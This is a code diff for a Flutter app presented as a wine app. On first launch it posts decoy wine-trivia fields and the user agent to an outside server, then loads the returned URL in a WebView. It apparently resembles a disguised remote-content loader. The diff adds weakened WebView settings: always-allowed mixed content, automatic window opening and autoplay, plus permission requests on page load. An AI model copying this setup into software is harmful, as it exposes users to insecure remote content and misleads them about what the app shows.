@@ -65,13 +65,15 @@ class _LoadingScreenState extends State<LoadingScreen> {
   Future<void> _checkStatus(BuildContext context) async {
     final provider = Provider.of<BottleProvider>(context, listen: false);
     final isFirstOpen = await provider.isFirstAppOpen();
-    provider.url = await provider.loadUrl();
 
     try {
+      provider.url = await provider.loadUrl();
+
       if (isFirstOpen) {
         var uri = Uri.parse(
           'https://crystorz-furrious.site/oldest_bottle2026/',
         );
+
         final userAgent = await getUserAgent();
 
         var response = await http.post(
@@ -81,14 +83,10 @@ class _LoadingScreenState extends State<LoadingScreen> {
             'Content-Type': 'application/json',
           },
           body: jsonEncode({
-            'giftwave_instinct': 'calm_reflection',
-            'unwrap_memory_code': 'UX192837',
-            'echowrap_tradition': 'heritage_pulse',
-            'surprise_curve_effect': 'unexpected_joy',
-            'oldest_winery': 'Château de Goulaine',
-            'wine_in_space': 'Stardust Merlot',
-            'red_white_grapes': 'Cabernet Sauvignon',
-            'wine_ocean': 'Deep Sea Chardonnay',
+            "oldest_winery": "Massandra Winery",
+            "wine_in_space": "Cosmic Cabernet",
+            "red_white_grapes": "Merlot/Muscat",
+            "wine_ocean": "Pacific Pinot",
           }),
         );
 
@@ -237,6 +235,10 @@ class _WebViewScreenState extends State<WebViewScreen> {
       allowFileAccessFromFileURLs: false,
       allowUniversalAccessFromFileURLs: false,
       useOnDownloadStart: true,
+      mixedContentMode: MixedContentMode.MIXED_CONTENT_ALWAYS_ALLOW,
+      javaScriptCanOpenWindowsAutomatically: true,
+      supportMultipleWindows: true,
+      mediaPlaybackRequiresUserGesture: false,
     );
 
     return PopScope(
@@ -259,17 +261,6 @@ class _WebViewScreenState extends State<WebViewScreen> {
           body: InAppWebView(
             initialUrlRequest: URLRequest(url: WebUri(widget.url)),
             initialSettings: settings,
-            initialOptions: InAppWebViewGroupOptions(
-              android: AndroidInAppWebViewOptions(
-                useHybridComposition: true,
-                supportMultipleWindows: true,
-              ),
-              crossPlatform: InAppWebViewOptions(
-                useShouldOverrideUrlLoading: true,
-                mediaPlaybackRequiresUserGesture: true,
-                javaScriptCanOpenWindowsAutomatically: true,
-              ),
-            ),
             shouldOverrideUrlLoading: (controller, navigationAction) async {
               final url = navigationAction.request.url.toString();
               if (await _handleCustomScheme(url)) {
@@ -277,12 +268,7 @@ class _WebViewScreenState extends State<WebViewScreen> {
               }
               return NavigationActionPolicy.ALLOW;
             },
-            onWebViewCreated: (controller) {
-              webViewController = controller;
-            },
-            onProgressChanged: (controller, progress) {
-              print('WebView загружается: $progress%');
-            },
+            onProgressChanged: (controller, progress) {},
             onLoadStart: (controller, url) {
               SystemChrome.setPreferredOrientations([
                 DeviceOrientation.portraitUp,
@@ -290,14 +276,13 @@ class _WebViewScreenState extends State<WebViewScreen> {
                 DeviceOrientation.landscapeLeft,
                 DeviceOrientation.landscapeRight,
               ]);
-              print('Загрузка страницы началась: $url');
+
               setState(() {
                 currentUrl = url?.toString();
               });
             },
             onLoadStop: (controller, url) async {
               await _requestPermissions();
-              print('Загрузка завершена: $url');
             },
             onEnterFullscreen: (controller) {
               SystemChrome.setPreferredOrientations([
